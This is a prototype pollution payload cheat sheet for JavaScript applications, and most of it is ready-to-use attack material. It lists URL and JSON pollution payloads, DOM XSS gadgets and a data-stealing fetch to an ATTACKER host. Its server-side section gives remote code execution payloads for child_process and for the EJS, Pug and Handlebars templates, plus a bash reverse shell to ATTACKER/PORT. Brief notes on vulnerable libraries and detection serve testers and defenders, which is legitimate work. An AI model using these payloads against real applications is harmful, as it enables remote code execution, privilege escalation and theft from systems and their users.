# Prototype Pollution Payloads

## Overview

```
# JavaScript prototype pollution occurs when an attacker can modify
# Object.prototype, affecting ALL objects in the application.
# Attack vector: JSON merge/deep-merge operations, URL parameter parsers,
# or any function that recursively sets properties on objects.

# Key concept: obj.__proto__ === Object.prototype
# Setting obj.__proto__.isAdmin = true → every object now has isAdmin = true
```

## Client-Side Prototype Pollution

### Via URL/Hash
```
# Pollute via query parameters (if parsed into object)
https://TARGET/?__proto__[isAdmin]=true
https://TARGET/?__proto__.isAdmin=true
https://TARGET/#__proto__[isAdmin]=true

# Constructor-based (alternative path)
https://TARGET/?constructor[prototype][isAdmin]=true
https://TARGET/?constructor.prototype.isAdmin=true
```

### Via JSON Input
```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}

// Alternative path
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

### DOM XSS via Prototype Pollution
```javascript
// If library checks: if (options.innerHTML) element.innerHTML = options.innerHTML
// Pollute: __proto__[innerHTML]=<img src=x onerror=alert(1)>

// If library checks: if (config.transport_url) script.src = config.transport_url
// Pollute: __proto__[transport_url]=data:,alert(1)//

// If library checks: if (config.url) fetch(config.url)
// Pollute: __proto__[url]=//ATTACKER/steal?

// jQuery gadgets:
__proto__[src][]=data:,alert(1)//
__proto__[href]=javascript:alert(1)
__proto__[url]=javascript:alert(1)

// Common gadget: script.setAttribute(key, value) where key comes from prototype
__proto__[srcdoc]=<script>alert(1)</script>
```

## Server-Side Prototype Pollution

### RCE via Child Process
```json
// Node.js: child_process.exec/spawn/fork inherit prototype properties
// If code does: require('child_process').exec(cmd, options)
// And options is spread from polluted object:

{
  "__proto__": {
    "shell": "/proc/self/exe",
    "argv0": "console.log(require('child_process').execSync('id').toString())//"
  }
}

// Alternative: NODE_OPTIONS env pollution
{
  "__proto__": {
    "env": {
      "NODE_OPTIONS": "--require /proc/self/environ"
    }
  }
}
```

### RCE via child_process.fork
```json
{
  "__proto__": {
    "execPath": "/bin/bash",
    "execArgv": ["-c", "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"]
  }
}
```

### Status Code Override
```json
// If framework checks: res.statusCode = options.status || 200
{
  "__proto__": {
    "status": 500,
    "statusCode": 500
  }
}
```

### EJS Template RCE
```json
// EJS (Embedded JavaScript) template engine
// If app uses: res.render('page', data) where data is polluted
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
  }
}

// Alternative EJS gadgets:
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1;return process.mainModule.require('child_process').execSync('id')"
  }
}
```

### Pug Template RCE
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "val": "x]);process.mainModule.require('child_process').execSync('id');//"
    }
  }
}
```

### Handlebars Template RCE
```json
{
  "__proto__": {
    "type": "Program",
    "body": [{
      "type": "MustacheStatement",
      "path": 0,
      "params": [{
        "type": "NumberLiteral",
        "value": "process.mainModule.require('child_process').execSync('id')"
      }]
    }]
  }
}
```

## Vulnerable Libraries/Functions

```
# Known vulnerable patterns:
# - lodash.merge / lodash.defaultsDeep (fixed in 4.17.12+)
# - jQuery.extend(true, {}, untrusted)
# - Hoek.merge / Hoek.applyToDefaults
# - node-forge
# - minimist (fixed in 1.2.6+)
# - deep-extend
# - qs (query string parser, fixed in 6.9+)
# - Any custom deep-merge function without __proto__ check

# Detection:
# 1. Search for: merge, extend, assign, deepCopy, clone
# 2. Check if user input flows into these functions
# 3. Test: {"__proto__":{"polluted":"true"}} then check {}.polluted
```

## Detection & Confirmation

```javascript
// Client-side: open browser console after polluting
console.log({}.polluted);       // should show "true" if polluted
console.log(({}).isAdmin);      // check specific property

// Server-side: look for behavior changes
// - Unexpected 500 errors (status code pollution)
// - JSON response with extra properties
// - Changed default values
```

## Payloads by Context

```
# URL parameters (try all of these):
?__proto__[test]=polluted
?__proto__.test=polluted
?constructor[prototype][test]=polluted
?constructor.prototype.test=polluted

# JSON body:
{"__proto__":{"test":"polluted"}}
{"constructor":{"prototype":{"test":"polluted"}}}

# Nested objects:
{"a":{"__proto__":{"test":"polluted"}}}
```
